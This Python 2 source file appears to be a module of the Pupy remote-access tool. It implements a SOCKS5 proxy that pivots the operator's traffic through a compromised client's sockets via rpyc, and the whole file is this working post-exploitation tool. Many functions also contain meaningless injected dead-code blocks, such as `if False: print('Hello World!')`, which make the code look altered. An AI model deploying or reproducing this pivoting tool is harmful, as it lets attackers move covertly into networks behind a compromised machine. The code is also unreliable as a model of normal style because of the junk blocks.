from pupylib.PupyModule import config, PupyModule, PupyArgumentParser, QA_UNSTABLE
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
__class_name__ = 'Socks5Proxy'
CODE_SUCCEEDED = '\x00'
CODE_GENERAL_SRV_FAILURE = '\x01'
CODE_CONN_NOT_ALLOWED = '\x02'
CODE_NET_NOT_REACHABLE = '\x03'
CODE_HOST_UNREACHABLE = '\x04'
CODE_CONN_REFUSED = '\x05'
CODE_TTL_EXPIRED = '\x06'
CODE_COMMAND_NOT_SUPPORTED = '\x07'
CODE_ADDRESS_TYPE_NOT_SUPPORTED = '\x08'
CODE_UNASSIGNED = '\t'

class SocketPiper(threading.Thread):

    def __init__(self, read_sock, write_sock):
        if False:
            print('Hello World!')
        threading.Thread.__init__(self)
        self.daemon = True
        self.read_sock = read_sock
        self.write_sock = write_sock

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        try:
            self.read_sock.setblocking(0)
            while True:
                data = ''
                try:
                    data += self.read_sock.recv(1000000)
                    if not data:
                        break
                except Exception as e:
                    if e[0] == 9:
                        break
                    if not data:
                        time.sleep(0.05)
                    continue
                self.write_sock.sendall(data)
        except Exception as e:
            logging.debug('error in socket piper: %s', traceback.format_exc())
        finally:
            try:
                self.write_sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.write_sock.close()
            except:
                pass
            try:
                self.read_sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.read_sock.close()
            except:
                pass
        logging.debug('piper finished')

class Socks5RequestHandler(SocketServer.BaseRequestHandler):

    def _socks_response(self, code, terminate=False):
        if False:
            return 10
        ip = ''.join([chr(int(i)) for i in self.server.server_address[0].split('.')])
        port = struct.pack('!H', self.server.server_address[1])
        self.request.sendall('\x05' + code + '\x00' + '\x01' + ip + port)
        if terminate:
            try:
                self.request.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.request.close()
            except:
                pass

    def handle(self):
        if False:
            while True:
                i = 10
        self.request.settimeout(5)
        VER = self.request.recv(1)
        NMETHODS = self.request.recv(1)
        self.request.recv(int(struct.unpack('!B', NMETHODS)[0]))
        "\n        o  X'00' NO AUTHENTICATION REQUIRED\n        o  X'01' GSSAPI\n        o  X'02' USERNAME/PASSWORD\n        o  X'03' to X'7F' IANA ASSIGNED\n        o  X'80' to X'FE' RESERVED FOR PRIVATE METHODS\n        o  X'FF' NO ACCEPTABLE METHODS\n        "
        self.request.sendall('\x05\x00')
        VER = self.request.recv(1)
        if VER != '\x05':
            self.server.module.error('receiving unsuported socks version: %s' % VER.encode('hex'))
            self._socks_response(CODE_GENERAL_SRV_FAILURE, terminate=True)
            return
        CMD = self.request.recv(1)
        if CMD != '\x01':
            self.server.module.error('receiving unsuported socks CMD: %s' % CMD.encode('hex'))
            self._socks_response(CODE_COMMAND_NOT_SUPPORTED, terminate=True)
            return
        self.request.recv(1)
        DST_ADDR = None
        DST_PORT = None
        ATYP = self.request.recv(1)
        if ATYP == '\x01':
            DST_ADDR = '.'.join([str(ord(x)) for x in self.request.recv(4)])
            DST_PORT = struct.unpack('!H', self.request.recv(2))[0]
        elif ATYP == '\x03':
            DOMAIN_LEN = int(struct.unpack('!B', self.request.recv(1))[0])
            DST_ADDR = self.request.recv(DOMAIN_LEN)
            DST_PORT = struct.unpack('!H', self.request.recv(2))[0]
        else:
            self.server.module.error('atyp not supported: %s' % ATYP.encode('hex'))
            self._socks_response(CODE_ADDRESS_TYPE_NOT_SUPPORTED, terminate=True)
            return
        self.server.module.info('connecting to %s:%s ...' % (DST_ADDR, DST_PORT))
        rsocket_mod = self.server.rpyc_client.conn.modules.socket
        rsocket = rsocket_mod.socket(rsocket_mod.AF_INET, rsocket_mod.SOCK_STREAM)
        rsocket.settimeout(5)
        try:
            rsocket.connect((DST_ADDR, DST_PORT))
        except Exception as e:
            self.server.module.error('error %s connecting to %s:%s ...' % (str(e), DST_ADDR, DST_PORT))
            if e[0] == 10060:
                self._socks_response(CODE_HOST_UNREACHABLE, terminate=True)
            else:
                self._socks_response(CODE_NET_NOT_REACHABLE, terminate=True)
            return
        self._socks_response(CODE_SUCCEEDED)
        self.server.module.success('connection to %s:%s succeed !' % (DST_ADDR, DST_PORT))
        sp1 = SocketPiper(self.request, rsocket)
        sp2 = SocketPiper(rsocket, self.request)
        sp1.start()
        sp2.start()
        sp1.join()
        sp2.join()
        self.server.module.info('conn to %s:%s closed' % (DST_ADDR, DST_PORT))

class Socks5Server(SocketServer.TCPServer):
    allow_reuse_address = True

    def __init__(self, server_address, RequestHandlerClass, bind_and_activate=True, rpyc_client=None, module=None):
        if False:
            i = 10
            return i + 15
        self.rpyc_client = rpyc_client
        self.module = module
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)

class ThreadedSocks5Server(SocketServer.ThreadingMixIn, Socks5Server):
    pass

@config(cat='network', tags=['pivot', 'proxy'])
class Socks5Proxy(PupyModule):
    """ start a socks5 proxy going through a client """
    max_clients = 1
    unique_instance = True
    daemon = True
    server = None
    qa = QA_UNSTABLE

    @classmethod
    def init_argparse(cls):
        if False:
            print('Hello World!')
        cls.arg_parser = PupyArgumentParser(prog='socks5proxy', description=cls.__doc__)
        cls.arg_parser.add_argument('-p', '--port', default='1080')
        cls.arg_parser.add_argument('action', choices=['start', 'stop'])

    def stop_daemon(self):
        if False:
            return 10
        self.success('shuting down socks server ...')
        if self.server:
            self.server.shutdown()
            del self.server
            self.success('socks server shut down')
        else:
            self.error('server is None')

    def run(self, args):
        if False:
            i = 10
            return i + 15
        if args.action == 'start':
            if self.server is None:
                self.success('starting server ...')
                self.server = ThreadedSocks5Server(('127.0.0.1', int(args.port)), Socks5RequestHandler, rpyc_client=self.client, module=self)
                t = threading.Thread(target=self.server.serve_forever)
                t.daemon = True
                t.start()
                self.success('socks5 server started on 127.0.0.1:%s' % args.port)
            else:
                self.error('socks5 server is already started !')
        elif args.action == 'stop':
            if self.server:
                self.job.stop()
                del self.job
                self.success('socks5 server stopped !')
            else:
                self.error('socks5 server is already stopped')